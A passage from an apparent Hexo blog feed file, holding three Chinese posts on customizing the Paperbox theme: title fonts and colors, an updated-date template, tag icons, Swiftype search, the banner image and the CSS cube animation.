        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>对我的paperbox（现在这个主题，landscape plus基础修改而来的，我引用了）做基于自己喜好的改造；</p><p>Part3: 字体美化与搜索框的添加</p><a id="more"></a><p>主题图变化</p><ul><li>换图</li></ul><p>cube优化</p><ul><li><p>cube改版！</p></li><li><p>cube不会自动滚动了</p></li></ul><p>速度</p><ul><li>加速访问 [见hexo博客搭建优化，这个和paperbox没有关系，所以不放在这里写]</li></ul><p>添加时间</p><ul><li>有个Update比较好~</li></ul><p>标签改一下</p><ul><li>太丑了；太小了</li></ul><p><strong>字体问题</strong></p><ul><li><strong>同上</strong></li></ul><p><strong>代码高亮</strong></p><ul><li><strong>感觉代码不是很好看，说不定就会改了</strong></li></ul><p><strong>search</strong></p><ul><li><strong>添加站内搜索</strong></li></ul><h2 id="字体问题"><a href="#字体问题" class="headerlink" title="字体问题"></a>字体问题</h2><p>蜜汁绿色，哈哈哈哈</p><p>so easy~</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// source/css/_partial/header.styl</span></span><br><span class="line">#blog-title</span><br><span class="line">  <span class="attribute">text-decoration</span>: none</span><br><span class="line">  <span class="comment">//修改了下颜色</span></span><br><span class="line">  <span class="attribute">color</span>: blog-title-color</span><br><span class="line">  <span class="attribute">font-size</span>: blog-title-size</span><br><span class="line">  <span class="attribute">font-weight</span>: bold</span><br><span class="line">  <span class="comment">//修改了字体</span></span><br><span class="line">  <span class="attribute">font-family</span>: fantasy</span><br><span class="line">  <span class="attribute">line-height</span>: blog-title-size</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">10px</span></span><br><span class="line">  <span class="attribute">text-shadow</span>:  <span class="number">1px</span> <span class="number">1px</span> <span class="number">4px</span> rgba(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.4</span>),</span><br><span class="line">                <span class="number">0px</span> <span class="number">1px</span> <span class="number">10px</span> rgba(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>),</span><br><span class="line">                <span class="number">0px</span> <span class="number">6px</span> <span class="number">15px</span> rgba(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><p>最后在全局变量文件里面加上</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// source/css/_variables.styl</span></span><br><span class="line"><span class="comment">// Header</span></span><br><span class="line">blog-title-size = <span class="number">2.66em</span> <span class="comment">//改大了一点</span></span><br><span class="line">blog-title-<span class="attribute">color</span> = rgb(<span class="number">89</span>, <span class="number">164</span>, <span class="number">143</span>) //绿色</span><br></pre></td></tr></table></figure><p>对比图：</p><img src="https://i.loli.net/2019/09/30/IswBGmljqg6NPUK.png" alt="原版的" style="zoom:50%"> <img src="https://i.loli.net/2019/09/30/1KTBFC94HfdeZtN.png" alt="标题上色变漂亮~" style="zoom:50%"><h2 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h2><p>方法1：<a href="https://www.zfl9.com/hexo-code.html" target="_blank" rel="noopener">https://www.zfl9.com/hexo-code.html</a></p><p>方法2：<a href="http://masikkk.com/article/hexo-12-google-code-prettify/" target="_blank" rel="noopener">http://masikkk.com/article/hexo-12-google-code-prettify/</a></p><p>我失败了Orz，我没有替换成功，我就是把字体改小了点</p><figure class="highlight stylus"><figcaption><span>source/css/_partial/highlight.styl</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.article-entry</span><br><span class="line">  pre, code</span><br><span class="line">    <span class="attribute">font-family</span>: font-mono</span><br><span class="line">  code</span><br><span class="line">    ...</span><br><span class="line">  pre</span><br><span class="line">    ...</span><br><span class="line">  .highlight</span><br><span class="line">    @extend <span class="variable">$code</span>-block</span><br><span class="line">    <span class="comment">//Add it to change coder size</span></span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.85em</span></span><br></pre></td></tr></table></figure><p>看着也还行吧</p><p><img src="https://i.loli.net/2019/12/04/YIhazW9xtZfGbKS.png" alt="image-20190930171335022"></p><h2 id="站内搜索的添加"><a href="#站内搜索的添加" class="headerlink" title="站内搜索的添加"></a>站内搜索的添加</h2><p>原作者用的swiftype，还可以吧，直接申请账号然后填写swiftype_key到_config.yml下就阔以啦</p><p><img src="https://i.loli.net/2019/12/04/iydUrJmNVfcW4xk.png" alt="搜索框实例"></p><p>当然，你阔以设置下显示格式，网上教程蛮多，不说了，把图里面的马赛克填到swiftype_key里面就成</p><p><img src="https://i.loli.net/2019/12/04/WeMYNqOc8bkDXIH.png" alt="swiftype_key"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当然啦，我稍微还加了个图标，favicon.ico，和一个about.html，以及把背景图换了下，截止到现在，它的效果就如网站所示啦</p><p>折腾了这几天，把自己的博客做成了自己喜欢的样子还是很开心的；如果哪天看着觉得不顺眼了，说不定会再折腾会，哈哈哈</p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Paperbox主题改造2-更新时间和标签美化</title>
      <link href="/2019/09/07/changepaperbox2/"/>
      <url>/2019/09/07/changepaperbox2/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>对我的paperbox（现在这个主题，landscape plus基础修改而来的，我引用了）做基于自己喜好的改造；</p><p>Part2: 加入Updated时间和标签美化~</p><a id="more"></a><p>主题图变化</p><ul><li>换图</li></ul><p>cube优化</p><ul><li><p>cube改版！</p></li><li><p>cube不会自动滚动了</p></li></ul><p>速度</p><ul><li>加速访问 [见基于Hexo创建博客，这个和paperbox没有关系，所以不放在这里写]</li></ul><p><strong>添加时间</strong></p><ul><li><strong>有个Update比较好~</strong></li></ul><p><strong>标签改一下</strong></p><ul><li><strong>太丑了；太小了</strong></li></ul><p>字体问题</p><ul><li>同上</li></ul><p>代码高亮</p><ul><li>感觉代码不是很好看，说不定就会改了</li></ul><p>search</p><ul><li>加上search框</li></ul><h2 id="添加更新时间"><a href="#添加更新时间" class="headerlink" title="添加更新时间"></a>添加更新时间</h2><p>原版没有更新时间，感觉很别扭呀，不知道这个博客更新过没，也不知道时效；很苦恼，网上一搜，都是next的主题的，还有一个基于landscape的，非常具有参考价值：<a href="http://howiefh.github.io/2014/04/20/hexo-optimize-and-my-theme-landscape-f/" target="_blank" rel="noopener">hexo优化及主题Landscape-F</a></p><h3 id="修改layout页面模板"><a href="#修改layout页面模板" class="headerlink" title="修改layout页面模板"></a>修改layout页面模板</h3><p>根据我们上一篇的思路，应该是两个操作，layout模板——修改页面显示、获取时间</p><p>每篇文章开头都有个时间，这个时间是在哪的呢：<code>layout/_partial/article.ejs</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;article id=&quot;&lt;%= post.layout %&gt;-&lt;%= post.slug %&gt;&quot; class=&quot;article article-type-&lt;%= post.layout %&gt;&quot; itemscope itemprop=&quot;blogPost&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;article-meta&quot;&gt;</span><br><span class="line">    &lt;%- partial(&apos;post/date&apos;, &#123;class_name: &apos;article-date&apos;, date_format: null, data_type: &apos;date&apos;&#125;) %&gt;</span><br><span class="line">    &lt;%- partial(&apos;post/category&apos;) %&gt;</span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>说实话，没有都明白字段意义，但是可以想到，如果复制这一句话，我们不就可以在页面显示两遍时间了咩~（data_type: ‘date’是我后面加的，其实没用到，我就不删了）</p><p>对于<code>layout/_partial/post/date.ejs</code>我将我的<strong>更新时间写在了footer里面</strong>，放在标签前面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;footer class=&quot;article-footer&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;article-footer-content&quot;&gt;</span><br><span class="line">        &lt;%- partial(&apos;post/date&apos;, &#123;class_name: &apos;article-updated&apos;, date_format: null, data_type: &apos;updated&apos;&#125;) %&gt;</span><br><span class="line">        &lt;%- partial(&apos;post/tag&apos;) %&gt;</span><br><span class="line">        ...</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/footer&gt;</span><br></pre></td></tr></table></figure><p>那么这个时间从哪来？？？太菜了，不知道Orz，只能推断到数据由<code>layout/_partial/post/date.ejs</code>处理显示逻辑，看看<strong>原处理逻辑</strong>：</p><p><strong><em>[old] date.ejs</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h3 href=&quot;&lt;%- url_for(post.path) %&gt;&quot; class=&quot;&lt;%= class_name %&gt;&quot;&gt;</span><br><span class="line">  &lt;time datetime=&quot;&lt;%= date_xml(post.date) %&gt;&quot; itemprop=&quot;datePublished&quot;&gt;&lt;%= date(post.date, date_format) %&gt;&lt;/time&gt;</span><br><span class="line">&lt;/h3&gt;</span><br></pre></td></tr></table></figure><p>对每一个”post/date”都是这个处理逻辑，那么只要我<strong>处理一下这个逻辑</strong>，这么写 <a href="https://github.com/howiefh/hexo-theme-landscape-f/blob/master/layout/_partial/post/date.ejs" target="_blank" rel="noopener">参考</a>：</p><p><strong><em>[new] date.ejs</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;% if (class_name != &apos;article-updated&apos;) &#123; %&gt;</span><br><span class="line">  &lt;h3 href=&quot;&lt;%- url_for(post.path) %&gt;&quot; class=&quot;&lt;%= class_name %&gt;&quot;&gt;</span><br><span class="line">    &lt;time datetime=&quot;&lt;%= date_xml(post.date) %&gt;&quot; itemprop=&quot;datePublished&quot;&gt;&lt;%= date(post.date, date_format) %&gt;&lt;/time&gt;</span><br><span class="line">  &lt;/h3&gt;</span><br><span class="line">  &lt;% &#125; else if (post.updated!=null &amp;&amp; theme.display_updated != false) &#123; %&gt;</span><br><span class="line">    &lt;h3 href=&quot;&lt;%- url_for(post.path) %&gt;&quot; class=&quot;&lt;%= class_name %&gt;&quot;&gt;</span><br><span class="line">      &lt;%= __(&apos;updated&apos;) %&gt;&amp;nbsp;:&amp;nbsp;&lt;time datetime=&quot;&lt;%= date_xml(post.updated) %&gt;&quot; itemprop=&quot;datePublished&quot;&gt;&lt;%= date(post.updated, date_format) %&gt;&lt;/time&gt;</span><br><span class="line">    &lt;/h3&gt;</span><br><span class="line">  &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>当我的class_name不是’article-updated’，返回原来的值，否则，就输出post.updated的值；可以用<code>&lt;%= __(&#39;updated&#39;) %&gt;</code>来访问”Updated:/更新于:”这种写在language的yml文件里的常量字符串。</p><blockquote><p>关于这个处理逻辑，建议使用 class_name != ‘article-updated’；因为还有很多地方用到了这个ejs，我们应该尽量不改变原逻辑</p></blockquote><h3 id="更改样式"><a href="#更改样式" class="headerlink" title="更改样式"></a>更改样式</h3><p><code>source/css/_partial/article.styl</code>加一个，这样，date.ejs就可以找到这个样式啦（<code>class=&quot;&lt;%= class_name %&gt;&quot;&gt;</code>）~</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.article-date</span><br><span class="line">  @extend <span class="variable">$block</span>-caption</span><br><span class="line">  <span class="attribute">float</span>: left</span><br><span class="line">  <span class="attribute">letter-spacing</span>: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ADD it</span></span><br><span class="line">.article-updated</span><br><span class="line">    <span class="attribute">color</span>: color-grey</span><br><span class="line">    <span class="attribute">text-decoration</span>: none</span><br></pre></td></tr></table></figure><p>最后看下效果</p><p><img src="https://i.loli.net/2019/12/04/9LajAlOrGnXkJzc.png" alt="image-20190929201947361"></p><img src="https://i.loli.net/2019/12/04/umWqiOlfBTaZVYD.png" alt="image-20190929202024981" style="zoom:50%"><h2 id="标签优化"><a href="#标签优化" class="headerlink" title="标签优化"></a>标签优化</h2><p>原标签如上，我觉得不好看，所以我改成了酱晒的：</p><p><img src="https://i.loli.net/2019/12/04/camXJyFKvkLWU6H.jpg" alt="标签美化后"></p><p>超级简单的，首先，找到一个样例，然后copy:</p><p>你看这个主题标签就很好看，<a href="http://moxfive.xyz/，但是一想到，介个吧，五颜六色的标签不适合我这个性冷淡的博客风格，所以只盗用前面的小标签符号我觉得就很不错啦" target="_blank" rel="noopener">http://moxfive.xyz/，但是一想到，介个吧，五颜六色的标签不适合我这个性冷淡的博客风格，所以只盗用前面的小标签符号我觉得就很不错啦</a></p><p>修改<code>source/css/_partial/article.styl</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.article-tag-list-link</span><br><span class="line">  &amp;:before</span><br><span class="line">    <span class="comment">//内容是『f02b』</span></span><br><span class="line">    <span class="attribute">content</span>: <span class="string">"\f02b"</span></span><br><span class="line">    <span class="comment">//font的family是fontAwesome</span></span><br><span class="line">    <span class="attribute">font-family</span>: font-icon</span><br><span class="line">    <span class="comment">//和后面字符的距离</span></span><br><span class="line">    <span class="attribute">padding-right</span>: <span class="number">2px</span>;</span><br></pre></td></tr></table></figure><p><code>source/css/_variables.styl</code>里面定义了</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fonts</span></span><br><span class="line"><span class="attribute">font</span>-sans = <span class="string">"Helvetica Neue"</span>, <span class="string">"Helvetica"</span>, <span class="string">"Hiragino Sans GB"</span>, <span class="string">"Microsoft YaHei"</span>, <span class="string">"Source Han Sans CN"</span>, <span class="string">"WenQuanYi Micro Hei"</span>, Arial, sans-serif</span><br><span class="line"><span class="attribute">font</span>-serif = <span class="string">"Droid Serif"</span>, Georgia, Serif</span><br><span class="line"><span class="attribute">font</span>-mono = <span class="string">"Source Code Pro"</span>, Consolas, Monaco, Menlo, Consolas, monospace</span><br><span class="line"><span class="attribute">font</span>-icon = FontAwesome</span><br><span class="line"><span class="attribute">font</span>-icon-path = <span class="string">"//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/fonts/fontawesome-webfont"</span></span><br><span class="line"><span class="attribute">font</span>-icon-version = <span class="string">"4.2.0"</span></span><br><span class="line"><span class="attribute">font-size</span> = <span class="number">14px</span></span><br><span class="line"><span class="attribute">line-height</span> = <span class="number">1.6em</span></span><br><span class="line"><span class="attribute">line-height</span>-title = <span class="number">1.1em</span></span><br></pre></td></tr></table></figure><p>FontAwesome是啥呢，<a href="https://astronautweb.co/snippet/font-awesome/" target="_blank" rel="noopener">https://astronautweb.co/snippet/font-awesome/</a></p><p>在里面，你可以找到很多很好用又很漂亮的小图标哦~</p><p><img src="https://i.loli.net/2019/12/04/pDi3PsJu4qjyEKa.png" alt="FontAwesome部分图标"></p><p>关于字体太小的问题</p><p>这个因为他们都放在footer里面，所以修改footer的字体大小就阔以啦，我从0.85改到了0.9，微调</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// source/css/_partial/article.styl</span></span><br><span class="line">.article-footer-<span class="attribute">content</span></span><br><span class="line">  clearfix()</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.9em</span></span><br></pre></td></tr></table></figure><p>至此，我的footer我就很满意啦~</p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Paperbox主题改造1-主题背景与Cube</title>
      <link href="/2019/09/06/changepaperbox1/"/>
      <url>/2019/09/06/changepaperbox1/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>对我的paperbox（现在这个主题，landscape plus基础修改而来的，我引用了）做基于自己喜好的改造；</p><p>Part1: 主题图片替换~</p><a id="more"></a><h2 id="原版"><a href="#原版" class="headerlink" title="原版"></a>原版</h2><p>原版本身就是一个改版啦，具体介绍如下<a href="https://github.com/sun11/hexo-theme-paperbox" target="_blank" rel="noopener">https://github.com/sun11/hexo-theme-paperbox</a></p><p>关于作者的贡献：<a href="https://www.sun11.me/blog/2016/hexo-theme-paperbox/" target="_blank" rel="noopener">https://www.sun11.me/blog/2016/hexo-theme-paperbox/</a></p><p><img src="https://i.loli.net/2019/09/29/DOBlFhd6ctPyC3I.png" alt="原版图片"></p><p>要改的地方还挺多的，这边列一下，要改的地方还不少；比如这个时间表示、特别是，我觉得背景太难看了;其次那个小方块也是太难看了，怎么做一个自己喜欢的呢</p><p>前端知识太少；方法蠢笨，Orz。但是原版作者啥也没写，所以还是记录下吧</p><p>如果遇到啥问题，其实都可以通过看别人的代码结构来得到，具有非常相似的结构</p><p><a href="https://github.com/sun11/hexo-theme-paperbox" target="_blank" rel="noopener">hexo-theme-paperbox</a></p><p><a href="https://github.com/howiefh/hexo-theme-landscape-f" target="_blank" rel="noopener">hexo-theme-landscape-f</a></p><p><a href="https://github.com/hexojs/hexo-theme-landscape/" target="_blank" rel="noopener">hexo-theme-landscape</a></p><p><a href="http://shijiajie.com/2015/08/29/hexo-theme-landscape-plus-optimize/" target="_blank" rel="noopener">Hexo官方主题landscape-plus优化</a></p><p><strong><em>计划</em></strong></p><hr><p>速度</p><ul><li>加速访问 [见hexo博客搭建优化，这个和paperbox没有关系，所以不放在这里写]</li></ul><p><strong>主题图变化</strong></p><ul><li><strong>修改成自己喜欢的图片</strong></li></ul><p><strong>cube优化</strong></p><ul><li><strong>cube改版！</strong></li></ul><ul><li><strong>cube不会自动滚动了</strong></li></ul><p>添加时间</p><ul><li>有个Update比较好~</li></ul><p>标签改一下</p><ul><li>太丑了；太小了</li></ul><p>字体问题</p><ul><li>同上</li></ul><p>代码高亮</p><ul><li>感觉代码不是很好看，说不定就会改了</li></ul><p>search</p><ul><li>加上search框</li></ul><h2 id="主题基础架构"><a href="#主题基础架构" class="headerlink" title="主题基础架构"></a>主题基础架构</h2><p>由于我刚接触hexo不久，所以呢~不是特别了解，我是多了解一点就多写一点</p><blockquote><p>_config.yml</p></blockquote><p>就像是全局变量，访问方便；也可以理解为全局配置；里面所有配置的意思我还没吃透，用哪个写哪个</p><img src="https://i.loli.net/2019/09/29/tBdorxNbZWYRihH.png" alt="_config.yml" style="zoom:40%"><blockquote><p>source/</p></blockquote><p>资源文件，图片，css，js都在里面吧，比如你要修改啥啥的样式，就在这里操作的比较多</p><blockquote><p>layout/</p></blockquote><p>后缀基本就是.ejs，这文件，emmmm，以前没好好学js，当事人表示现在非常后悔；我理解的就是模板文件，如果你要修改你的网站模样，肯定要涉及的</p><blockquote><p>language/</p></blockquote><img src="https://i.loli.net/2019/09/29/Qka9XLcb4iT1Cqn.png" alt="image-20190929192618478" style="zoom:40%"><p>这个主要是不同语言文件使用的不同语言；可以用<code>&lt;%= __(&#39;updated&#39;) %&gt;</code>来访问其值</p><p>别的不懂了，用到的也少</p><h2 id="主题图变化"><a href="#主题图变化" class="headerlink" title="主题图变化"></a>主题图变化</h2><p>图片存放位置：<code>/source/css/images</code></p><p>修改样式位置：<code>source/css/_variables.styl</code>这个文件，就是<strong>css的全局变量文件</strong></p><p>修改选项：<code>banner-url = &quot;images/firefly.jpg&quot;</code></p><p>背景图片默认居中；所以基本上就是图片的正中位置会被显示；注意剪裁一下；为了防止图片加载时间过长，建议参考yelee的gitbook进行压缩和渐进式调整；</p><p><a href="http://moxfive.xyz/2016/05/17/image-compression/" target="_blank" rel="noopener">http://moxfive.xyz/2016/05/17/image-compression/</a></p><p>前面看到图片放在images下，直接引用全局变量就行啦~然后加载是这样的，在<code>source/css/_partial/header.styl</code>里面，</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#banner</span><br><span class="line">  <span class="attribute">position</span>: absolute</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span></span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span></span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span></span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span></span><br><span class="line">  <span class="attribute">background</span>: url(banner-url) center color-grey</span><br><span class="line">  <span class="attribute">background-size</span>: cover</span><br><span class="line">  <span class="attribute">z-index</span>: -<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="cube优化"><a href="#cube优化" class="headerlink" title="cube优化"></a>cube优化</h2><p>原版感觉有点不搭</p><img src="https://i.loli.net/2019/09/23/MbP9pgduSTEOCqA.png" alt="image-20190906190551460" style="zoom:50%"><p>修改之后</p><img src="https://i.loli.net/2019/09/23/hTyBkUS1VH5vCDi.png" alt="image-20190906190619006" style="zoom:50%"><p>哈哈哈，是不是感觉有点花哨；但是我觉得还是比较契合这个背景图；另外，六面都有含义的~~不管聪不聪明你肯定知道含义23333；P图P得太烂了，好惨Orz</p><p>这里主要记录下修改的地方和过程</p><p>（啊，我这个主题cube不会自动滚动了，后期排查一下）</p><h3 id="样式修改"><a href="#样式修改" class="headerlink" title="样式修改"></a>样式修改</h3><p>每个面的透明程度和边框颜色修改位置：<code>source/css/_partial/header.styl</code>建议在chrome上调试颜色之后再修改，方便些</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//133行左右</span></span><br><span class="line"><span class="comment">// CSS Animated Cube</span></span><br><span class="line">#contenedor</span><br><span class="line">...</span><br><span class="line">  ul</span><br><span class="line">    ...</span><br><span class="line">    li</span><br><span class="line">      <span class="attribute">box-sizing</span>: border-box</span><br><span class="line">      <span class="attribute">background</span>: rgba(<span class="number">240</span>, <span class="number">240</span>, <span class="number">240</span>, <span class="number">0.06</span>) //最后一个是透明程度，值越小越透明</span><br><span class="line">      <span class="attribute">border</span>: <span class="number">1px</span> solid rgba(<span class="number">255</span>, <span class="number">250</span>, <span class="number">66</span>, <span class="number">0.38</span>) //边框颜色</span><br><span class="line">      <span class="comment">//display: block</span></span><br><span class="line">      <span class="attribute">display</span>: flex;</span><br><span class="line">      <span class="attribute">justify-content</span>: center;</span><br><span class="line">      <span class="attribute">align-items</span>: center;</span><br><span class="line">      <span class="attribute">list-style-type</span>: none</span><br><span class="line">      <span class="attribute">position</span>: absolute</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">100%</span></span><br><span class="line">      <span class="attribute">height</span>: <span class="number">100%</span></span><br><span class="line">      <span class="attribute">font-size</span>: <span class="number">1.5em</span></span><br><span class="line">      <span class="attribute">color</span>: rgba(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.5</span>) //这个是字体颜色</span><br><span class="line">      <span class="attribute">letter-spacing</span>: <span class="number">1px</span></span><br><span class="line">      <span class="attribute">text-align</span>: center</span><br><span class="line">      <span class="attribute">line-height</span>: <span class="number">100px</span></span><br><span class="line">      user-select: <span class="attribute">none</span></span><br></pre></td></tr></table></figure><h3 id="填充图片"><a href="#填充图片" class="headerlink" title="填充图片"></a>填充图片</h3><p>为了填充图片居中，我在上面代码中修改了几个字段，一个是<code>li</code>的<code>display</code>属性改成了<code>flex</code>，还有添加了<code>justify-content: center; align-items: center;</code></p><p>图片参数放在主题下的<code>_config.yml</code>下</p><h4 id="layout模板修改"><a href="#layout模板修改" class="headerlink" title="layout模板修改"></a>layout模板修改</h4><p>cube的代码在<code>layout/_partial/header.ejs</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;contenedor&quot;&gt;</span><br><span class="line">  &lt;ul class=&quot;cube&quot;&gt;</span><br><span class="line">    &lt;li class=&quot;cara&quot;&gt;&lt;img src=&quot;&lt;%= theme.logo_time %&gt;&quot; style=&quot;height:50%; width:50%;opacity:0.8&quot; /&gt;&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;cara&quot;&gt;也可以填充文字&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;cara&quot;&gt;啥都行&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;cara&quot;&gt;...&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;cara&quot;&gt;...&lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;cara&quot;&gt;...&lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br></pre></td></tr></table></figure><p>所以我把图片放在<code>imgs</code>下，并在主题的<code>_config.yml</code>下，加入了路径；<code>&lt;%= _config_variables %&gt;</code>可以直接访问<code>_config.yml</code>的定义</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">logo_time:</span> <span class="string">/img/cube/time.png</span></span><br></pre></td></tr></table></figure><p>其实你也可以修改每个面的background，但是这样的话6个面要区分开来</p><h3 id="cube加载时转动"><a href="#cube加载时转动" class="headerlink" title="cube加载时转动"></a>cube加载时转动</h3><p>cube不会自己转了，不知道为什么，现在也不知道，但是我翻了翻<a href="https://sun11.me/" target="_blank" rel="noopener">原博客</a>发现我们的style好像有一些些不一样，所以，我就copy了以下，修改如下，其实就是让它适配多个浏览器并且配置了<code>spincube</code>，也就是旋转方式；</p><figure class="highlight stylus"><figcaption><span>source/css/_partial/header.styl</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 